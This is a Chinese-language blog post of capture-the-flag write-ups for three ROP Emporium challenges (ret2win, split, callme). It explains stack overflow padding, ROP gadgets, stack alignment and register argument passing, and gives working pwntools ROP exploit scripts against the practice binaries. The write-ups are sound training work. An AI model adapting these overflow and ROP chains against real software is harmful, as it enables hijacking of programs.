---
title: ROP Emporium的一些wp
description: 关于ROP Emporium的一些总结
date: 2026-05-07 22:17:50
updated: 2026-05-07 22:17:50
image: https://img.mushfate.top/2026/05/0bc9fb1703f785617edfb20da547288a.jpg
categories: [技术]
tags: [学习]
---

## ROP Emporium

贴上链接

::link-card
---
title: ROP Emporium
icon: https://ropemporium.com/favicon/favicon.ico
link: https://ropemporium.com/
class: gradient-card active
---
::

## 1.ret2win

**前情提要: 在s数组(32字节)后面，存在 8 字节的saved rbp(作用是保存调用者的栈帧基址)，而在 save rbp 后面才是我们所需利用的返回地址。所以在ROP链开始时，我们需要填入 32+8=40 字节的无用字符作为填充(表现为`payload = b'1' * 40`) 。从第41字节开始是返回地址的位置，我们需要在这里写入控制程序的内容，让程序乖乖吐出flag。**

用ida打开附件，函数 **pwnme**，看关键两行
```c
_BYTE s[32]；
read(0, s, 56u);
```
确定是栈溢出，函数 **ret2win--0x400756** ->伪代码:
```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```
执行 **ret2win** 函数会返回flag。但由于 **system()** 调用要求栈必须 16 字节对齐，如果直接跳到函数入口 **0x400756** ，栈会不对齐导致崩溃。有两种解决方案：一是用额外的 **ret gadget** 消耗栈空间使其对齐；二是直接跳到 **0x400757** ，栈自然对齐。(ret是一条汇编指令，意思是：从栈顶取出一个地址，跳过去执行)这里我用ROPgadget 找一个 ret：
```bash
ROPgadget --binary xxx --only "pop|ret"
###输出 0x000000000040053e : ret
```
写payload
```python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
elf = ELF('./ret2win')
# 静态的ELF对象，可以访问符号表中的值
io = process('./ret2win')
# 加载程序的进程
ret = 0x40053e
payload = b'1'*40 + p64(ret) + p64(0x400756)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```
得到flag:`ROPE{a_placeholder_32byte_flag!}`

原理大概是这样，**read()** 把这串数据写进栈里，覆盖掉了返回地址。当 **pwnme()** 执行完 **ret** 时，它不会回正常位置，而是跳到我们伪造的地址。
栈可以想象成这样，越下面越后面被取到：

```
[  1 * 40  ]
[ 0x40053e ]  <- 第一次 ret 跳到这里
[ 0x400756 ]  <- "ret2win"
```
执行过程是这样，**pwnme **结束，执行自己的 ret，这时它会从栈顶取出一个地址跳过去，也就是跳到 **0x40053e**->那个单独的 ret。执行 **0x40053e: ret**，这条 ret 会从栈顶取下一个地址继续跳：也就是 **0x400756**，执行 **ret2win**,出flag


## 2.split

**前情提要:函数 system@plt 可以执行命令**

依旧是pwnme里关键的两行

```c
_BYTE s[32];
read(0, s, 96u);
```

栈溢出,这里在函数列表里看到一个特殊的函数 **usefulFunciton** 。伪代码里只有一句`return system("/bin/ls")`，也就是列出当前目录下的所有文件和文件夹。由于 ROP Emporium 是纯本地练习题，flag文件已经确认，这里在ROP链上就不使用这个函数了，~~哦吼吼绝对不是懒~~，在有远程靶机地址的情况下需要额外使用这个函数确认flag的文件名。

目前还没找到flag的相关信息,尝试扩大检索范围。同时按下 shift + F4 打开 **name** 列表，可以看到有一个特殊的字符串 **usefulString -- 0x601060** ,具体内容是`/bin/cat flag.txt'`。这就是我们需要的字符串。目标明确了:**让 system@plt -- 0x400560 执行/bin/cat flag.txt，从而读取并打印flag。**

另外补充一下，x86_64 的函数参数传递规则是：函数的第一个参数传给**寄存器 rdi** ，第二个参数传给**寄存器 rsi** ，第三个参数传给**寄存器 rdx** ...这里的 **system@plt** 只需要`/bin/cat flag.txt`这一个参数，因此在这题只需要找出**寄存器 rdi** 即可。

先用 ROPgadget 找到我们需要的 gadget 

```bash
ROPgadget --binary split --only "pop|ret"
###输出  0x000000000040053e : ret
###	    0x00000000004007c3 : pop rdi ; ret
```

套个模板

```python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
elf = ELF('./split')
# 静态的ELF对象，可以访问符号表中的值
io = process('./split')
pop_rdi_ret = 0x4007c3
# 加载程序的进程
ret = 0x40053e
system_plt = 0x400560
bin_cat_flag = 0x601060
payload = b'1' * 40
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(bin_cat_flag)
payload += p64(system_plt)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

得到flag：`ROPE{a_placeholder_32byte_flag!}`

## 3.callme

栈溢出,在function列表里看到有 **usefulfunction **分别是

```c
callme_one(a1, a2, a3)
callme_two(a1, a2, a3)
callme_three(a1, a2, a3)
```

ida打开另一个附件 **libcallme.so** 查看这几个函数的具体内容。可以看到想执行三个函数有一个共同条件:`a1 = 0xDEADBEEFDEADBEEF || a2 = 0xCAFEBABECAFEBABE || a3 = 0xD00DF00DD00DF00D`。在满足a1,a2,a3的参数条件后 **callme_one** 的有效内容是`fopen("encrypted_flag.dat", "r")`-->打开加密的flag文件, **callme_two** 的有效内容是 `fopen("key1.dat", "r")-->第一层解密` , **callme_three** 的有效内容是`fopen("key2.dat", "r")-->第二层解密`，也就是说我们需要按照one->two->three的顺序去依次调用这三个函数。由于每个 callme 函数都有三个参数,我们需要找三个寄存器**rdi,rsi,rdx**的 gadget 。在callme附件,可以看到usefulGadget里已经给了我们解题需要的 gadget :`pop_rdi_rsi_rdx--0x40093c` 。

万事具备,套模板！

```Python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./callme')
# 静态的ELF对象，可以访问符号表中的值
io = process('./callme')
    # 加载程序的进程
callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006F0
a1 = 0xDEADBEEFDEADBEEF
a2 = 0xCAFEBABECAFEBABE
a3 = 0xD00DF00DD00DF00D
pop_rdi_rsi_rdx = 0x40093c
payload = flat(
    b"1" * 40,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_one,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_two,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_three,
)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

拿到flag:`ROPE{a_placeholder_32byte_flag!}`

相信有细心的同学发现了,在这段脚本里我使用了 **flat** 这个函数取代了臃肿的 **payload+=** 。在ROP链里, **flat** 可以按照顺序自动把每一段payload增添到已写的payload后面。如 `pop_rdi_rsi_rdx, a1, a2, a3,callme_one` 里,**a1,a2,a3**根据顺序依次存入寄存器**rdi,rsi,rdx**,作为调用 **callme_one** 的三个参数,保证程序正常运行。在使用 **flat** 函数时，需要在脚本开头加上这样一段话 `context.arch = 'amd64'`, 这段话可以让 `flat()` 使用 **64 位**打包。这是因为`flat()` 默认使用 **32位** 打包，数值太大超出了范围,会造成程序报错。

